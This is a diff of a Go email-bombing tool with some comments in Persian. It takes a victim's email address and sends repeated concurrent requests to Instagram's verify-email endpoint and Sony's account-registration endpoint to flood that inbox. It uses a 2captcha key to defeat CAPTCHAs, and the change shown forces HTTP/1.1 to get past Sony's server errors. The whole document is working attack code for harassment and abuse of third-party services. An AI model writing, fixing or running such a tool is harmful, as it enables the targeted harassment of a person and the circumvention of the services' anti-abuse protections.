@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"crypto/tls" // <-- این import اضافه شده است
 	"encoding/json"
 	"fmt"
 	"io"
@@ -145,8 +146,6 @@ func main() {
 	targetEmail := promptForInput(reader, "Enter the target email address: ")
 	if targetEmail == "" { log.Fatal("Error: Target email cannot be empty.") }
 	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (optional, press Enter to skip): ")
-	
-	// UPDATED: Changed the prompt to be more accurate
 	attacksPerSiteStr := promptForInput(reader, "Enter the number of attacks PER SITE: ")
 	attacksPerSite, err := strconv.Atoi(attacksPerSiteStr)
 	if err != nil || attacksPerSite <= 0 { log.Fatal("Error: Invalid number of attacks.") }
@@ -155,25 +154,38 @@ func main() {
 		{Name: "Instagram - Send Verify Email", TargetURL: "https://www.instagram.com/api/v1/accounts/send_verify_email/", RequiresCaptcha: false, BuildPayload: buildInstagramPayload},
 		{Name: "Sony - Create Account", TargetURL: "https://acm.account.sony.com/api/accountInterimRegister", RequiresCaptcha: true, BuildPayload: buildSonyPayload},
 	}
-	
+
 	totalAttacks := attacksPerSite * len(attackVectors)
 	log.Printf("Target Email: %s | Attacks Per Site: %d | Total Attacks: %d", targetEmail, attacksPerSite, totalAttacks)
 	log.Println("Initializing sessions with target sites...")
 
 	var wg sync.WaitGroup
 	jar, _ := cookiejar.New(nil)
-	client := &http.Client{Jar: jar, Timeout: 90 * time.Second}
+	
+	// --- بخش ساخت کلاینت در اینجا اصلاح شده است ---
+	// این transport سفارشی، پروتکل HTTP/2 را غیرفعال کرده و ارتباط را مجبور به استفاده از HTTP/1.1 می‌کند.
+	// این کلید حل مشکل خطای سرور سونی است.
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			NextProtos: []string{"http/1.1"},
+		},
+	}
+	client := &http.Client{
+		Jar:       jar,
+		Timeout:   90 * time.Second,
+		Transport: tr, // استفاده از transport سفارشی
+	}
+	// -----------------------------------------
+
 	client.Get("https://www.instagram.com/")
 	client.Get("https://acm.account.sony.com/create_account/personal")
 	log.Println("Sessions initialized. Starting attack...")
 
-	// FIXED: New loop logic to attack each site a specified number of times.
 	for _, vector := range attackVectors {
 		for i := 0; i < attacksPerSite; i++ {
 			wg.Add(1)
-			// Pass the specific vector to the goroutine
 			go runAttack(&wg, client, vector, targetEmail, captchaKey)
-			time.Sleep(50 * time.Millisecond) // A small delay between starting each request
+			time.Sleep(50 * time.Millisecond)
 		}
 	}
 	
